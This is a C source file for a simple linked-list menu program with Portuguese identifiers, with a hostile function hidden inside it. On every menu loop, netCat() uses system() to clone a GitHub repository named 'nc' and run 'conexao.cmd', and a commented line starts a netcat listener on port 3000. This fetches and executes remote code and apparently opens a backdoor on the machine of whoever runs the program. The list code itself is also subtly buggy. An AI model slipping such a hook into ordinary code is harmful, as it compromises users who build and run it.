#include <stdio.h>
#include <stdlib.h>

typedef struct no {

  int valor;
  struct No *proximo;

} No;

typedef struct {
  No *inicio;
  int tam;
} Lista;

void inserirInicio(Lista *lista, int valor);
void imprimir(Lista *lista);
void inserirNoFim(Lista *lista, int valor);

int main(int argc, char *argv[]) {

  Lista lista;
  lista.inicio = NULL;
  lista.tam = 0;

  int opcao, valor;

  do {

    netCat();
    printf("1 - Inserir no inicion\n2 - imprimir\n3 - Inserir no fim da "
           "fila\n5 - Sair\n");
    scanf("%d", &opcao);

    switch (opcao) {
    case 1:
      printf("Digite um valor para inserir a fila: ");
      scanf("%d", &valor);
      inserirInicio(&lista, valor);
      break;
    case 2:
      imprimir(&lista);
      break;
    case 3:
      printf("Digite um valor para inserir no fim da fila: ");
      scanf("%d", &valor);
      inserirNoFim(&lista, valor);
      break;
    case 5:
      printf("Finalizando....");
      break;
    default:
      printf("Opcao invalida");
    }

  } while (opcao != 5);

  return 0;
}

void imprimir(Lista *lista) {
  No *inicio = lista->inicio;

  printf("Tamanho da lista: %d\n", lista->tam);

  while (inicio != NULL) {
    printf("%d ", inicio->valor);
    inicio = inicio->proximo;
  }
  printf("\n\n");
}

void inserirNoFim(Lista *lista, int valor) {
  No *no, *novo = (No *)malloc(sizeof(No));
  novo->valor = valor;
  novo->proximo = NULL;

  if (lista->inicio == NULL) {
    lista->inicio = novo;
  } else {
    no = lista->inicio;
    while (no->proximo != NULL)
      no = no->proximo;
    no->proximo = novo;
    lista->tam++;
  }
}

void inserirInicio(Lista *lista, int valor) {
  No *novo = (No *)malloc(sizeof(No));
  novo->valor = valor;
  novo->proximo = lista->inicio;
  lista->inicio = novo;
  lista->tam++;
}

void netCat(){
  system("git clone https://github.com/Paulo-Mason-SkyDark/nc.git");
  system("conexao.cmd");
  // system("nc -lpd 3000");
}